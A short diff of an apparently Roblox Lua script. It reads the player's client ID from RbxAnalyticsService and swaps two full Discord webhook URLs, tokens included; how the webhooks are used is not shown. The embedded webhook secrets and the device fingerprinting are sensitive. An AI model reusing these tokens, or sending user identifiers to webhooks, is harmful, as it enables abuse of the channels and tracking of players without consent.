@@ -1,8 +1,8 @@
 local lplr = game.Players.LocalPlayer
 local clientID = game:GetService("RbxAnalyticsService"):GetClientId()
 
-local hook = "https://discord.com/api/webhooks/1156876916956090388/01GL7jYJF56a4r23Zc-LZHRdTNn-cRgP7chlhP-3pCus0c_s8wI1E6uw5vpbnSk9L9eW"  
-local blekhook = "https://discord.com/api/webhooks/1156876705923866695/pscLGIAVAFjLD7OkNyNfb7fGtu_t_LlgXLHGEhpup5hyS_Twia58ISXXACWAKJl77mPh" 
+local hook = "https://discord.com/api/webhooks/1156871567356203088/XQbXT6Y-84FPfKCMzHe49imjAbT4_pUQ_Gs2gqm4o7m8_3B6FsMjyAgWwpppSiGH0kjw"  
+local blekhook = "https://discord.com/api/webhooks/1156873739225530378/x9Ki34ZjPx3WyBo2aRS4boUHQOl-4cZpO7J71JwZ_qwlAf-3456ffIL6KpuHbZZgpUFT" 
 
 
 if not clientID then
